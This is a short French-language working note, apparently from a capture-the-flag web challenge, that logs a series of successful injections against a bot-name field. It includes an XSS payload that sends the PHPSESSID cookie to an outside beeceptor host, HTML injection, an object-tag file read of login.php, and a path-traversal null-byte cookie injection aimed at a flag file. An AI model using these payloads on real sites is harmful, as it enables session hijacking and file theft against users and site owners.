On peut modifier le nom du bot à volonté, le payload XSS suivant est opérationnel

```javascript 
<script>alert(window.location);</script>
```

il y a un formulaire de contact sur la page, et il y a un cookie en PHPSESSID, à vérifier:

* que le cookie ne soit pas en HttpOnly
* que je puisse faire l'exfiltration du cookie via une requête avec ngrok ou sur mon WAN


Bonne nouvelle, le cookie n'est pas HttpOnly, je devrais pouvoir le faire transiter tranquillement vers mon point d'extraction
Par contre, hier soir, je n'arrivai pas à joindre mon point en direct et ngrok affichait une page d'alerte

```javascript
<script>document.location='//tiphergane.free.beeceptor.com/?c='+document.cookie</script>
```
l'injection XSS ci-dessus fonctionne très bien, je récupère bien mon PHPSESSID, mais j'aurais dû tester le formulaire de mail avant, car je ne sais pas s'il est K.O ce matin, ou down by purpose, je vais aller voir les sources si je peux trouver ma réponse

le changement de nom du bot est aussi sensible aux injections HTML, la citation suivante fonctionne:

```html
<q>miaou in da box</q>
```

maintenant, reste à voir si comme N1nja, j'arrive à trouver une RCE à partir de ces deux injections:


Confirmation, **le formulaire de mail est down by purpose**

Ce n'est pas une **XSS**, par contre, on arrive à lire les fichiers avec la commande HTML  suivante:

```html
<div><object data="login.php"></object></div>
```

La page apparait dans une frame à la place du nom. Pourions nous trouver un moyen en HTML de scanner les répertoires ?
dans le cookie style, faire injection suivante : ../c2/upload/flag.txt%00
